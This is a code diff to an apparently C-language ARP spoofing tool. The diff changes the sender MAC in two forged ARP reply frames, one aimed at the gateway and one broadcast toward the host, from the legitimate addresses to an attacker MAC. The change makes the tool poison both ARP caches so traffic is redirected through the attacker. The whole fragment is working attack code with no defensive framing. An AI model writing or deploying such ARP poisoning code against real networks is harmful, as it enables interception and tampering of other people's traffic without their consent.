@@ -93,7 +93,7 @@ int main(int argc, char *argv[]) {
     arp->ea_hdr.ar_hln = ETH_ALEN;
     arp->ea_hdr.ar_pln = sizeof(in_addr_t);
     arp->ea_hdr.ar_op  = htons(ARPOP_REPLY);
-    memcpy(arp->arp_sha, host_mac, ETH_ALEN);      // pretend to be host
+    memcpy(arp->arp_sha, atk_mac,  ETH_ALEN);      // use attacker MAC!
     memcpy(&arp->arp_spa, &host_ip, sizeof(host_ip));
     memcpy(arp->arp_tha, gw_mac, ETH_ALEN);
     memcpy(&arp->arp_tpa, &gw_ip, sizeof(gw_ip));
@@ -110,7 +110,7 @@ int main(int argc, char *argv[]) {
     memcpy(eh->ether_dhost, bcast,   ETH_ALEN);
     eh->ether_type = htons(ETH_P_ARP);
     // ARP payload: target is host_mac
-    memcpy(arp->arp_sha, gw_mac, ETH_ALEN);        // pretend to be GW
+    memcpy(arp->arp_sha, atk_mac,  ETH_ALEN);
     memcpy(&arp->arp_spa, &gw_ip, sizeof(gw_ip));
     memcpy(arp->arp_tha, host_mac, ETH_ALEN);
     memcpy(&arp->arp_tpa, &host_ip, sizeof(host_ip));
